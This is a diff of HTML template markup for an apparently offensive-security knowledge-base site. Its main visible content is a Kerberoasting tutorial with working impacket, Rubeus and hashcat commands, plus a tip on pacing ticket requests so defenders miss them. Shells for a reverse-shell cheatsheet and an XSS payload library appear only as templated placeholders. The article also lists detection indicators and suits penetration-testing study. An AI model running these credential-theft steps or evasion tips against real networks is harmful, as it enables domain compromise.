+              <div><div style="color: oklch(0.94 0.006 80); margin-bottom: 3px;">File upload to RCE</div><div style="font-size: 12px; color: oklch(0.66 0.008 80);">Extension, MIME and magic-byte tricks per web server.</div></div>
+              <span style="font-size: 11px; color: oklch(0.76 0.008 80);">intermediate</span>
+              <span style="font-size: 11px; color: oklch(0.62 0.008 80);">server-side</span>
+              <span style="font-size: 11px; color: oklch(0.56 0.008 80);">21 Aug</span>
+            </div>
+            <div style="display: grid; grid-template-columns: minmax(0, 3fr) 90px 120px 78px; gap: 12px; padding: 12px 16px; border-bottom: 1px solid oklch(0.24 0.006 80); cursor: pointer; align-items: baseline;" style-hover="background: oklch(0.195 0.006 80);">
+              <div><div style="color: oklch(0.94 0.006 80); margin-bottom: 3px;">IDOR and broken object access</div><div style="font-size: 12px; color: oklch(0.66 0.008 80);">Finding the identifier, then proving impact cleanly.</div></div>
+              <span style="font-size: 11px; color: oklch(0.80 0.13 72);">beginner</span>
+              <span style="font-size: 11px; color: oklch(0.62 0.008 80);">access control</span>
+              <span style="font-size: 11px; color: oklch(0.56 0.008 80);">19 Aug</span>
+            </div>
+            <div onClick="{{ goNotFound }}" style="display: grid; grid-template-columns: minmax(0, 3fr) 90px 120px 78px; gap: 12px; padding: 12px 16px; cursor: pointer; align-items: baseline;" style-hover="background: oklch(0.195 0.006 80);">
+              <div><div style="color: oklch(0.94 0.006 80); margin-bottom: 3px;">Java deserialization</div><div style="font-size: 12px; color: oklch(0.66 0.008 80);">Gadget selection with ysoserial and detection of sinks.</div></div>
+              <span style="font-size: 11px; color: oklch(0.76 0.008 80);">advanced</span>
+              <span style="font-size: 11px; color: oklch(0.62 0.008 80);">server-side</span>
+              <span style="font-size: 11px; color: oklch(0.56 0.008 80);">12 Aug</span>
+            </div>
+          </div>
+          <div style="margin-top: 14px; font-size: 11.5px; color: oklch(0.58 0.008 80);">Showing 6 of 124 · <span style="color: oklch(0.80 0.13 72); cursor: pointer;">load more</span></div>
+        </div>
+      </sc-if>
+
+      <sc-if value="{{ isArticle }}">
+        <div style="display: grid; grid-template-columns: minmax(0, 1fr) 208px; gap: 0; align-items: start;">
+          <article style="min-width: 0; padding: 26px 36px 72px 40px; max-width: 860px;">
+            <div style="display: flex; gap: 8px; flex-wrap: wrap; font-size: 11.5px; color: oklch(0.58 0.008 80); margin-bottom: 20px;">
+              <span onClick="{{ goHome }}" style="cursor: pointer;">Home</span><span>/</span><span onClick="{{ goSection }}" style="cursor: pointer;">Active Directory</span><span>/</span><span>Kerberos</span><span>/</span><span style="color: oklch(0.86 0.006 80);">Kerberoasting</span>
+            </div>
+
+            <h1 style="font-family: Spectral, Georgia, serif; font-size: 38px; font-weight: 600; letter-spacing: -0.02em; margin: 0 0 14px 0; color: oklch(0.97 0.006 80);">Kerberoasting</h1>
+
+            <div style="display: flex; gap: 8px; flex-wrap: wrap; align-items: center; padding-bottom: 18px; border-bottom: 1px solid oklch(0.26 0.006 80); margin-bottom: 24px;">
+              <span style="padding: 3px 8px; font-size: 11px; background: oklch(0.80 0.13 72 / 0.14); border: 1px solid oklch(0.80 0.13 72 / 0.4); color: oklch(0.88 0.13 72);">intermediate</span>
+              <span style="padding: 3px 8px; font-size: 11px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.74 0.008 80);">credential access</span>
+              <span style="padding: 3px 8px; font-size: 11px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.74 0.008 80);">T1558.003</span>
+              <span style="padding: 3px 8px; font-size: 11px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.74 0.008 80);">requires: domain user</span>
+              <span style="flex: 1;"></span>
+              <span style="font-size: 11px; color: oklch(0.56 0.008 80);">updated 04 Sep 2026 · 7 min</span>
+            </div>
+
+            <p style="margin: 0 0 16px 0; font-size: 14.5px; color: oklch(0.86 0.006 80); text-wrap: pretty;">Any authenticated domain user can request a service ticket for any account with a registered SPN. The ticket is encrypted with the service account's password hash, so the request itself hands you an offline cracking target — no privileged access, no touching the target host.</p>
+
+            <div style="display: flex; gap: 12px; padding: 12px 14px; margin: 0 0 24px 0; background: oklch(0.80 0.13 72 / 0.07); border-left: 2px solid oklch(0.80 0.13 72);">
+              <span style="font-size: 10px; letter-spacing: 0.14em; text-transform: uppercase; color: oklch(0.84 0.13 72); min-width: 34px; padding-top: 2px;">Tip</span>
+              <p style="margin: 0; font-size: 13px; color: oklch(0.84 0.006 80);">Service accounts with old passwords and RC4-enabled tickets crack fastest. Sort your roast output by encryption type before you feed hashcat — the <span style="color: oklch(0.88 0.13 72);">$krb5tgs$23$</span> entries are the ones worth your GPU time.</p>
+            </div>
+
+            <h2 id="how" style="font-family: Spectral, Georgia, serif; font-size: 23px; font-weight: 600; margin: 30px 0 12px 0; color: oklch(0.96 0.006 80); scroll-margin-top: 66px;">How it works</h2>
+            <p style="margin: 0 0 14px 0; font-size: 14px; color: oklch(0.83 0.006 80); text-wrap: pretty;">When a user wants to reach a service, they ask the KDC for a TGS ticket for that service's SPN. The KDC returns a ticket encrypted with the NTLM hash of the account that owns the SPN. Because any domain user can make this request for any SPN, and the returned blob is crackable offline, the entire attack reduces to: enumerate SPNs, request tickets, crack.</p>
+
+            <h2 id="enumerate" style="font-family: Spectral, Georgia, serif; font-size: 23px; font-weight: 600; margin: 30px 0 12px 0; color: oklch(0.96 0.006 80); scroll-margin-top: 66px;">Enumerate roastable accounts</h2>
+            <p style="margin: 0 0 14px 0; font-size: 14px; color: oklch(0.83 0.006 80);">Find every user account that has a servicePrincipalName set. These are the only roastable targets.</p>
+
+            <div style="border: 1px solid oklch(0.28 0.006 80); border-radius: 4px; margin: 0 0 22px 0; overflow: hidden;">
+              <div style="display: flex; align-items: center; justify-content: space-between; padding: 7px 12px; background: oklch(0.19 0.006 80); border-bottom: 1px solid oklch(0.28 0.006 80); font-size: 11px; color: oklch(0.60 0.008 80);">
+                <span>impacket · GetUserSPNs.py</span>
+                <span onClick="{{ copy1 }}" style="cursor: pointer; color: {{ copy1Color }};" style-hover="color: oklch(0.88 0.13 72);">{{ copy1Label }}</span>
+              </div>
+              <pre style="margin: 0; padding: 13px 14px; overflow-x: auto; font-size: 12.5px; line-height: 1.7; color: oklch(0.88 0.006 80);"><span style="color: oklch(0.62 0.008 80);"># list SPNs across the domain</span>
+GetUserSPNs.py <span style="color: oklch(0.80 0.13 72);">-dc-ip</span> 10.10.10.5 corp.local/<span style="color: oklch(0.82 0.10 150);">jdoe</span>:'Passw0rd!'
+
+<span style="color: oklch(0.62 0.008 80);"># request and dump crackable hashes in one shot</span>
+GetUserSPNs.py <span style="color: oklch(0.80 0.13 72);">-request</span> <span style="color: oklch(0.80 0.13 72);">-dc-ip</span> 10.10.10.5 \
+  corp.local/<span style="color: oklch(0.82 0.10 150);">jdoe</span>:'Passw0rd!' <span style="color: oklch(0.80 0.13 72);">-outputfile</span> roast.txt</pre>
+            </div>
+
+            <div style="display: flex; gap: 12px; padding: 12px 14px; margin: 0 0 24px 0; background: oklch(0.62 0.12 30 / 0.09); border-left: 2px solid oklch(0.66 0.16 30);">
+              <span style="font-size: 10px; letter-spacing: 0.14em; text-transform: uppercase; color: oklch(0.74 0.15 30); min-width: 34px; padding-top: 2px;">Warn</span>
+              <p style="margin: 0; font-size: 13px; color: oklch(0.84 0.006 80);">A single account requesting a large batch of TGS tickets is the signature blue teams hunt for. Space requests out, or target only the two or three accounts you actually intend to crack.</p>
+            </div>
+
+            <h2 id="crack" style="font-family: Spectral, Georgia, serif; font-size: 23px; font-weight: 600; margin: 30px 0 12px 0; color: oklch(0.96 0.006 80); scroll-margin-top: 66px;">Crack offline</h2>
+            <div style="border: 1px solid oklch(0.28 0.006 80); border-radius: 4px; margin: 0 0 22px 0; overflow: hidden;">
+              <div style="display: flex; align-items: center; justify-content: space-between; padding: 7px 12px; background: oklch(0.19 0.006 80); border-bottom: 1px solid oklch(0.28 0.006 80); font-size: 11px; color: oklch(0.60 0.008 80);">
+                <span>hashcat · mode 13100</span>
+                <span onClick="{{ copy2 }}" style="cursor: pointer; color: {{ copy2Color }};" style-hover="color: oklch(0.88 0.13 72);">{{ copy2Label }}</span>
+              </div>
+              <pre style="margin: 0; padding: 13px 14px; overflow-x: auto; font-size: 12.5px; line-height: 1.7; color: oklch(0.88 0.006 80);">hashcat <span style="color: oklch(0.80 0.13 72);">-m</span> 13100 <span style="color: oklch(0.80 0.13 72);">-a</span> 0 roast.txt rockyou.txt \
+  <span style="color: oklch(0.80 0.13 72);">-r</span> rules/best64.rule <span style="color: oklch(0.80 0.13 72);">-O</span></pre>
+            </div>
+
+            <h2 id="matrix" style="font-family: Spectral, Georgia, serif; font-size: 23px; font-weight: 600; margin: 30px 0 12px 0; color: oklch(0.96 0.006 80); scroll-margin-top: 66px;">Tooling by access</h2>
+            <div style="border: 1px solid oklch(0.26 0.006 80); margin: 0 0 24px 0; overflow-x: auto;">
+              <div style="display: grid; grid-template-columns: 150px 1fr 130px; min-width: 520px;">
+                <div style="padding: 8px 12px; background: oklch(0.19 0.006 80); font-size: 10px; letter-spacing: 0.12em; text-transform: uppercase; color: oklch(0.58 0.008 80); border-bottom: 1px solid oklch(0.26 0.006 80);">Tool</div>
+                <div style="padding: 8px 12px; background: oklch(0.19 0.006 80); font-size: 10px; letter-spacing: 0.12em; text-transform: uppercase; color: oklch(0.58 0.008 80); border-bottom: 1px solid oklch(0.26 0.006 80);">Command</div>
+                <div style="padding: 8px 12px; background: oklch(0.19 0.006 80); font-size: 10px; letter-spacing: 0.12em; text-transform: uppercase; color: oklch(0.58 0.008 80); border-bottom: 1px solid oklch(0.26 0.006 80);">Context</div>
+                <div style="padding: 9px 12px; color: oklch(0.90 0.006 80); border-bottom: 1px solid oklch(0.24 0.006 80);">Rubeus</div>
+                <div style="padding: 9px 12px; color: oklch(0.82 0.006 80); border-bottom: 1px solid oklch(0.24 0.006 80);">Rubeus.exe kerberoast /nowrap</div>
+                <div style="padding: 9px 12px; color: oklch(0.68 0.008 80); border-bottom: 1px solid oklch(0.24 0.006 80);">on-host, Windows</div>
+                <div style="padding: 9px 12px; color: oklch(0.90 0.006 80); border-bottom: 1px solid oklch(0.24 0.006 80);">Impacket</div>
+                <div style="padding: 9px 12px; color: oklch(0.82 0.006 80); border-bottom: 1px solid oklch(0.24 0.006 80);">GetUserSPNs.py -request</div>
+                <div style="padding: 9px 12px; color: oklch(0.68 0.008 80); border-bottom: 1px solid oklch(0.24 0.006 80);">remote, Linux</div>
+                <div style="padding: 9px 12px; color: oklch(0.90 0.006 80);">CrackMapExec</div>
+                <div style="padding: 9px 12px; color: oklch(0.82 0.006 80);">cme ldap ... --kerberoasting</div>
+                <div style="padding: 9px 12px; color: oklch(0.68 0.008 80);">remote, spr0</div>
+              </div>
+            </div>
+
+            <h2 id="detection" style="font-family: Spectral, Georgia, serif; font-size: 23px; font-weight: 600; margin: 30px 0 12px 0; color: oklch(0.96 0.006 80); scroll-margin-top: 66px;">Detection footprint</h2>
+            <ul style="margin: 0 0 24px 0; padding-left: 20px; color: oklch(0.83 0.006 80); font-size: 14px;">
+              <li style="margin-bottom: 6px;">Event <span style="color: oklch(0.88 0.13 72);">4769</span> (TGS request) with ticket encryption type <span style="color: oklch(0.88 0.13 72);">0x17</span> (RC4) — the highest-signal indicator.</li>
+              <li style="margin-bottom: 6px;">A single principal requesting many distinct SPNs in a short window.</li>
+              <li style="margin-bottom: 6px;">Honeypot SPN accounts: any request for them is malicious by definition.</li>
+            </ul>
+
+            <div style="display: flex; align-items: center; gap: 10px; padding: 14px 0; border-top: 1px solid oklch(0.26 0.006 80); border-bottom: 1px solid oklch(0.26 0.006 80); margin-bottom: 26px; font-size: 11.5px; color: oklch(0.60 0.008 80);">
+              <span style="color: oklch(0.74 0.008 80);">Contributors</span>
+              <div style="display: flex; gap: -6px;">
+                <span style="width: 22px; height: 22px; border-radius: 50%; background: oklch(0.40 0.09 72); display: inline-flex; align-items: center; justify-content: center; font-size: 10px; color: oklch(0.95 0.006 80); border: 1px solid oklch(0.165 0.006 80);">jd</span>
+                <span style="width: 22px; height: 22px; border-radius: 50%; background: oklch(0.40 0.09 200); display: inline-flex; align-items: center; justify-content: center; font-size: 10px; color: oklch(0.95 0.006 80); border: 1px solid oklch(0.165 0.006 80); margin-left: -6px;">av</span>
+                <span style="width: 22px; height: 22px; border-radius: 50%; background: oklch(0.40 0.09 320); display: inline-flex; align-items: center; justify-content: center; font-size: 10px; color: oklch(0.95 0.006 80); border: 1px solid oklch(0.165 0.006 80); margin-left: -6px;">m0</span>
+              </div>
+              <span onClick="{{ goProfile }}" style="cursor: pointer;" style-hover="color: oklch(0.86 0.006 80);">jdoe, aviv, m0nk and 4 others</span>
+              <span style="flex: 1;"></span>
+              <span onClick="{{ goContribute }}" style="color: oklch(0.80 0.13 72); cursor: pointer;">Edit this page ↗</span>
+            </div>
+
+            <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+              <div style="flex: 1; min-width: 220px; border: 1px solid oklch(0.26 0.006 80); padding: 12px 14px; cursor: pointer;" style-hover="border-color: oklch(0.80 0.13 72 / 0.5);">
+                <div style="font-size: 10px; letter-spacing: 0.12em; text-transform: uppercase; color: oklch(0.56 0.008 80); margin-bottom: 5px;">Related</div>
+                <div style="color: oklch(0.92 0.006 80); margin-bottom: 3px;">AS-REP Roasting</div>
+                <div style="font-size: 12px; color: oklch(0.66 0.008 80);">No preauth required — same crack, different request.</div>
+              </div>
+              <div style="flex: 1; min-width: 220px; border: 1px solid oklch(0.26 0.006 80); padding: 12px 14px; cursor: pointer;" style-hover="border-color: oklch(0.80 0.13 72 / 0.5);">
+                <div style="font-size: 10px; letter-spacing: 0.12em; text-transform: uppercase; color: oklch(0.56 0.008 80); margin-bottom: 5px;">Related</div>
+                <div style="color: oklch(0.92 0.006 80); margin-bottom: 3px;">Silver Ticket</div>
+                <div style="font-size: 12px; color: oklch(0.66 0.008 80);">What to forge once the service hash cracks.</div>
+              </div>
+            </div>
+          </article>
+
+          <aside style="position: sticky; top: 54px; align-self: start; padding: 30px 20px 40px 18px; font-size: 12px; border-left: 1px solid oklch(0.24 0.006 80); max-height: calc(100vh - 54px); overflow: auto;">
+            <div style="font-size: 9.5px; letter-spacing: 0.16em; text-transform: uppercase; color: oklch(0.56 0.008 80); margin-bottom: 12px;">On this page</div>
+            <a href="#how" style="display: block; padding: 4px 0; color: oklch(0.74 0.008 80); border-left: 2px solid oklch(0.80 0.13 72); padding-left: 10px; margin-left: -2px;">How it works</a>
+            <a href="#enumerate" style="display: block; padding: 4px 0 4px 10px; color: oklch(0.66 0.008 80);">Enumerate accounts</a>
+            <a href="#crack" style="display: block; padding: 4px 0 4px 10px; color: oklch(0.66 0.008 80);">Crack offline</a>
+            <a href="#matrix" style="display: block; padding: 4px 0 4px 10px; color: oklch(0.66 0.008 80);">Tooling by access</a>
+            <a href="#detection" style="display: block; padding: 4px 0 4px 10px; color: oklch(0.66 0.008 80);">Detection footprint</a>
+          </aside>
+        </div>
+      </sc-if>
+
+      <sc-if value="{{ isCheat }}">
+        <div style="padding: 26px 40px 60px 40px;">
+          <div style="display: flex; gap: 8px; font-size: 11.5px; color: oklch(0.58 0.008 80); margin-bottom: 22px;">
+            <span onClick="{{ goHome }}" style="cursor: pointer;">Home</span><span>/</span><span style="color: oklch(0.86 0.006 80);">Cheatsheets</span><span>/</span><span style="color: oklch(0.86 0.006 80);">Reverse shells</span>
+          </div>
+          <div style="max-width: 760px; margin-bottom: 26px;">
+            <h1 style="font-family: Spectral, Georgia, serif; font-size: 36px; font-weight: 600; letter-spacing: -0.02em; margin: 0 0 12px 0; color: oklch(0.97 0.006 80);">Reverse shell one-liners</h1>
+            <p style="margin: 0; font-size: 14px; color: oklch(0.78 0.008 80); text-wrap: pretty;">Set <span style="color: oklch(0.88 0.13 72);">LHOST</span> and <span style="color: oklch(0.88 0.13 72);">LPORT</span> once and every block updates. Copy the one that matches the interpreter you already have on the box.</p>
+          </div>
+
+          <div style="display: flex; gap: 14px; flex-wrap: wrap; align-items: center; padding: 12px 14px; margin-bottom: 24px; border: 1px solid oklch(0.28 0.006 80); background: oklch(0.175 0.006 80);">
+            <span style="font-size: 11px; letter-spacing: 0.1em; text-transform: uppercase; color: oklch(0.58 0.008 80);">Variables</span>
+            <label style="display: flex; align-items: center; gap: 8px; color: oklch(0.80 0.13 72);">LHOST
+              <input value="{{ lhost }}" onInput="{{ setLhost }}" style="width: 130px; background: oklch(0.135 0.006 80); border: 1px solid oklch(0.32 0.006 80); color: oklch(0.94 0.006 80); font-family: 'IBM Plex Mono', monospace; font-size: 12.5px; padding: 5px 8px; border-radius: 3px;" />
+            </label>
+            <label style="display: flex; align-items: center; gap: 8px; color: oklch(0.80 0.13 72);">LPORT
+              <input value="{{ lport }}" onInput="{{ setLport }}" style="width: 76px; background: oklch(0.135 0.006 80); border: 1px solid oklch(0.32 0.006 80); color: oklch(0.94 0.006 80); font-family: 'IBM Plex Mono', monospace; font-size: 12.5px; padding: 5px 8px; border-radius: 3px;" />
+            </label>
+          </div>
+
+          <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 14px;">
+            <sc-for list="{{ shells }}" as="sh" hint-placeholder-count="6">
+              <div style="border: 1px solid oklch(0.28 0.006 80); border-radius: 4px; overflow: hidden;">
+                <div style="display: flex; align-items: center; justify-content: space-between; padding: 7px 12px; background: oklch(0.19 0.006 80); border-bottom: 1px solid oklch(0.28 0.006 80); font-size: 11px;">
+                  <span style="color: oklch(0.90 0.006 80);">{{ sh.name }}</span>
+                  <span onClick="{{ sh.copy }}" style="cursor: pointer; color: {{ sh.copyColor }};" style-hover="color: oklch(0.88 0.13 72);">{{ sh.copyLabel }}</span>
+                </div>
+                <pre style="margin: 0; padding: 12px 13px; overflow-x: auto; font-size: 12px; line-height: 1.65; color: oklch(0.86 0.006 80); white-space: pre-wrap; word-break: break-all;">{{ sh.cmd }}</pre>
+              </div>
+            </sc-for>
+          </div>
+        </div>
+      </sc-if>
+
+      <sc-if value="{{ isSearch }}">
+        <div style="padding: 26px 40px 60px 40px; max-width: 820px;">
+          <div style="position: relative; margin-bottom: 8px;">
+            <input value="{{ query }}" onInput="{{ setQuery }}" placeholder="search techniques, tools, payloads…" style="width: 100%; background: oklch(0.135 0.006 80); border: 1px solid oklch(0.32 0.006 80); color: oklch(0.95 0.006 80); font-family: 'IBM Plex Mono', monospace; font-size: 15px; padding: 13px 16px; border-radius: 4px;" style-focus="border-color: oklch(0.80 0.13 72);" />
+          </div>
+          <div style="display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 20px; font-size: 11px;">
+            <span style="color: oklch(0.58 0.008 80);">filters</span>
+            <span style="padding: 2px 9px; background: oklch(0.80 0.13 72 / 0.14); border: 1px solid oklch(0.80 0.13 72 / 0.4); color: oklch(0.88 0.13 72); cursor: pointer;">all</span>
+            <span style="padding: 2px 9px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.74 0.008 80); cursor: pointer;">web</span>
+            <span style="padding: 2px 9px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.74 0.008 80); cursor: pointer;">AD</span>
+            <span style="padding: 2px 9px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.74 0.008 80); cursor: pointer;">cloud</span>
+            <span style="padding: 2px 9px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.74 0.008 80); cursor: pointer;">cheatsheet</span>
+          </div>
+          <div style="font-size: 11.5px; color: oklch(0.58 0.008 80); margin-bottom: 12px;">{{ resultCount }} results for “{{ query }}”</div>
+
+          <sc-for list="{{ results }}" as="r" hint-placeholder-count="5">
+            <div onClick="{{ r.open }}" style="padding: 15px 0; border-top: 1px solid oklch(0.26 0.006 80); cursor: pointer;" style-hover="background: oklch(0.175 0.006 80);">
+              <div style="display: flex; gap: 8px; align-items: baseline; font-size: 11px; color: oklch(0.56 0.008 80); margin-bottom: 5px;">
+                <span>{{ r.path }}</span><span style="flex:1;"></span><span style="color: {{ r.levelColor }};">{{ r.level }}</span>
+              </div>
+              <div style="font-family: Spectral, Georgia, serif; font-size: 18px; color: oklch(0.94 0.006 80); margin-bottom: 4px;">{{ r.title }}</div>
+              <div style="font-size: 13px; color: oklch(0.72 0.008 80);">{{ r.snippet }}</div>
+            </div>
+          </sc-for>
+        </div>
+      </sc-if>
+
+      <sc-if value="{{ isTools }}">
+        <div style="padding: 26px 40px 60px 40px;">
+          <div style="display: flex; gap: 8px; font-size: 11.5px; color: oklch(0.58 0.008 80); margin-bottom: 22px;">
+            <span onClick="{{ goHome }}" style="cursor: pointer;">Home</span><span>/</span><span style="color: oklch(0.86 0.006 80);">Tool arsenal</span>
+          </div>
+          <div style="max-width: 760px; margin-bottom: 26px;">
+            <h1 style="font-family: Spectral, Georgia, serif; font-size: 36px; font-weight: 600; letter-spacing: -0.02em; margin: 0 0 12px 0; color: oklch(0.97 0.006 80);">Tool arsenal</h1>
+            <p style="margin: 0; font-size: 14px; color: oklch(0.78 0.008 80); text-wrap: pretty;">The tooling referenced across the wiki, with the install line and the pages that lean on it. Kept deliberately short — one tool per job.</p>
+          </div>
+          <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 1px; background: oklch(0.26 0.006 80); border: 1px solid oklch(0.26 0.006 80);">
+            <sc-for list="{{ tools }}" as="t" hint-placeholder-count="8">
+              <div onClick="{{ t.open }}" style="background: oklch(0.175 0.006 80); padding: 16px; cursor: pointer;" style-hover="background: oklch(0.205 0.006 80);">
+                <div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 7px;">
+                  <span style="font-family: Spectral, Georgia, serif; font-size: 17px; font-weight: 600; color: oklch(0.95 0.006 80);">{{ t.name }}</span>
+                  <span style="font-size: 10px; padding: 1px 7px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.72 0.008 80);">{{ t.cat }}</span>
+                </div>
+                <p style="margin: 0 0 10px 0; font-size: 12.5px; color: oklch(0.72 0.008 80);">{{ t.desc }}</p>
+                <code style="display: block; font-size: 11.5px; color: oklch(0.84 0.10 150); background: oklch(0.135 0.006 80); border: 1px solid oklch(0.26 0.006 80); padding: 5px 8px; border-radius: 3px; margin-bottom: 8px; white-space: pre-wrap; word-break: break-all;">{{ t.install }}</code>
+                <div style="font-size: 11px; color: oklch(0.56 0.008 80);">used on {{ t.pages }} pages</div>
+              </div>
+            </sc-for>
+          </div>
+        </div>
+      </sc-if>
+
+      <sc-if value="{{ isProfile }}">
+        <div style="padding: 26px 40px 60px 40px; max-width: 900px;">
+          <div style="display: flex; gap: 8px; font-size: 11.5px; color: oklch(0.58 0.008 80); margin-bottom: 22px;">
+            <span onClick="{{ goHome }}" style="cursor: pointer;">Home</span><span>/</span><span style="color: oklch(0.86 0.006 80);">Contributors</span><span>/</span><span style="color: oklch(0.86 0.006 80);">jdoe</span>
+          </div>
+          <div style="display: flex; gap: 20px; align-items: center; padding-bottom: 22px; border-bottom: 1px solid oklch(0.26 0.006 80); margin-bottom: 26px; flex-wrap: wrap;">
+            <span style="width: 64px; height: 64px; border-radius: 50%; background: oklch(0.40 0.09 72); display: inline-flex; align-items: center; justify-content: center; font-size: 24px; color: oklch(0.96 0.006 80); font-family: Spectral, Georgia, serif;">jd</span>
+            <div style="min-width: 0;">
+              <h1 style="font-family: Spectral, Georgia, serif; font-size: 30px; font-weight: 600; margin: 0 0 4px 0; color: oklch(0.97 0.006 80);">jdoe</h1>
+              <div style="font-size: 13px; color: oklch(0.74 0.008 80);">Red team lead · Active Directory & Kerberos · maintainer since 2023</div>
+            </div>
+            <span style="flex: 1;"></span>
+            <div style="display: flex; gap: 20px;">
+              <div style="text-align: right;"><div style="font-family: Spectral, Georgia, serif; font-size: 24px; color: oklch(0.95 0.006 80);">142</div><div style="font-size: 10px; letter-spacing: 0.1em; text-transform: uppercase; color: oklch(0.58 0.008 80);">edits</div></div>
+              <div style="text-align: right;"><div style="font-family: Spectral, Georgia, serif; font-size: 24px; color: oklch(0.95 0.006 80);">28</div><div style="font-size: 10px; letter-spacing: 0.1em; text-transform: uppercase; color: oklch(0.58 0.008 80);">pages</div></div>
+              <div style="text-align: right;"><div style="font-family: Spectral, Georgia, serif; font-size: 24px; color: oklch(0.88 0.13 72);">#4</div><div style="font-size: 10px; letter-spacing: 0.1em; text-transform: uppercase; color: oklch(0.58 0.008 80);">rank</div></div>
+            </div>
+          </div>
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 30px;">
+            <div>
+              <h2 style="font-family: Spectral, Georgia, serif; font-size: 18px; font-weight: 600; margin: 0 0 12px 0; color: oklch(0.95 0.006 80);">Maintains</h2>
+              <div onClick="{{ goArticle }}" style="padding: 9px 0; border-top: 1px solid oklch(0.26 0.006 80); cursor: pointer; color: oklch(0.90 0.006 80);" style-hover="color: oklch(0.88 0.13 72);">Kerberoasting</div>
+              <div onClick="{{ goArticle }}" style="padding: 9px 0; border-top: 1px solid oklch(0.26 0.006 80); cursor: pointer; color: oklch(0.90 0.006 80);" style-hover="color: oklch(0.88 0.13 72);">Golden &amp; Silver tickets</div>
+              <div onClick="{{ goArticle }}" style="padding: 9px 0; border-top: 1px solid oklch(0.26 0.006 80); border-bottom: 1px solid oklch(0.26 0.006 80); cursor: pointer; color: oklch(0.90 0.006 80);" style-hover="color: oklch(0.88 0.13 72);">Unconstrained delegation</div>
+            </div>
+            <div>
+              <h2 style="font-family: Spectral, Georgia, serif; font-size: 18px; font-weight: 600; margin: 0 0 12px 0; color: oklch(0.95 0.006 80);">Recent activity</h2>
+              <div style="display: flex; gap: 10px; padding: 9px 0; border-top: 1px solid oklch(0.26 0.006 80); font-size: 13px;"><span style="color: oklch(0.80 0.13 72); min-width: 60px;">rewrite</span><span style="color: oklch(0.86 0.006 80);">Kerberoasting</span></div>
+              <div style="display: flex; gap: 10px; padding: 9px 0; border-top: 1px solid oklch(0.26 0.006 80); font-size: 13px;"><span style="color: oklch(0.60 0.008 80); min-width: 60px;">edit</span><span style="color: oklch(0.86 0.006 80);">Reverse shell — php variant</span></div>
+              <div style="display: flex; gap: 10px; padding: 9px 0; border-top: 1px solid oklch(0.26 0.006 80); border-bottom: 1px solid oklch(0.26 0.006 80); font-size: 13px;"><span style="color: oklch(0.82 0.10 150); min-width: 60px;">new</span><span style="color: oklch(0.86 0.006 80);">Silver ticket forging</span></div>
+            </div>
+          </div>
+        </div>
+      </sc-if>
+
+      <sc-if value="{{ isNotFound }}">
+        <div style="padding: 90px 40px 80px 40px; text-align: center;">
+          <div style="font-family: 'IBM Plex Mono', monospace; font-size: 13px; color: oklch(0.74 0.15 30); letter-spacing: 0.14em; margin-bottom: 16px;">HTTP 404 · PAGE NOT FOUND</div>
+          <h1 style="font-family: Spectral, Georgia, serif; font-size: 42px; font-weight: 600; letter-spacing: -0.02em; margin: 0 auto 14px auto; color: oklch(0.97 0.006 80); max-width: 620px; text-wrap: pretty;">This technique isn't documented — yet.</h1>
+          <p style="margin: 0 auto 26px auto; max-width: 520px; font-size: 14px; color: oklch(0.76 0.008 80); text-wrap: pretty;">The page you followed doesn't exist or was moved during a merge. Search the base, or write it yourself — every page here started as a gap.</p>
+          <div style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;">
+            <span onClick="{{ goSearch }}" style="padding: 9px 16px; background: oklch(0.80 0.13 72); color: oklch(0.16 0.03 72); font-weight: 600; font-size: 12.5px; border-radius: 3px; cursor: pointer;">Search the base</span>
+            <span onClick="{{ goContribute }}" style="padding: 9px 16px; border: 1px solid oklch(0.34 0.006 80); color: oklch(0.90 0.006 80); font-size: 12.5px; border-radius: 3px; cursor: pointer;" style-hover="border-color: oklch(0.80 0.13 72); color: oklch(0.88 0.13 72);">Write this page</span>
+          </div>
+        </div>
+      </sc-if>
+
+      <sc-if value="{{ isPayloads }}">
+        <div style="padding: 26px 40px 60px 40px;">
+          <div style="display: flex; gap: 8px; font-size: 11.5px; color: oklch(0.58 0.008 80); margin-bottom: 22px;">
+            <span onClick="{{ goHome }}" style="cursor: pointer;">Home</span><span>/</span><span style="color: oklch(0.86 0.006 80);">Payload library</span><span>/</span><span style="color: oklch(0.86 0.006 80);">XSS</span>
+          </div>
+          <div style="max-width: 760px; margin-bottom: 22px;">
+            <h1 style="font-family: Spectral, Georgia, serif; font-size: 36px; font-weight: 600; letter-spacing: -0.02em; margin: 0 0 12px 0; color: oklch(0.97 0.006 80);">XSS payload library</h1>
+            <p style="margin: 0; font-size: 14px; color: oklch(0.78 0.008 80); text-wrap: pretty;">Curated cross-site scripting vectors grouped by context. Copy the whole set for a fuzzing list, or grab a single line for the sink you are testing.</p>
+          </div>
+
+          <div style="display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 22px; align-items: center;">
+            <span style="padding: 4px 10px; font-size: 11.5px; background: oklch(0.80 0.13 72 / 0.14); border: 1px solid oklch(0.80 0.13 72 / 0.4); color: oklch(0.88 0.13 72); cursor: pointer;">All contexts</span>
+            <span style="padding: 4px 10px; font-size: 11.5px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.76 0.008 80); cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">HTML body</span>
+            <span style="padding: 4px 10px; font-size: 11.5px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.76 0.008 80); cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">Attribute</span>
+            <span style="padding: 4px 10px; font-size: 11.5px; border: 1px solid oklch(0.30 0.006 80); color: oklch(0.76 0.008 80); cursor: pointer;" style-hover="border-color: oklch(0.46 0.008 80);">JS string</span>
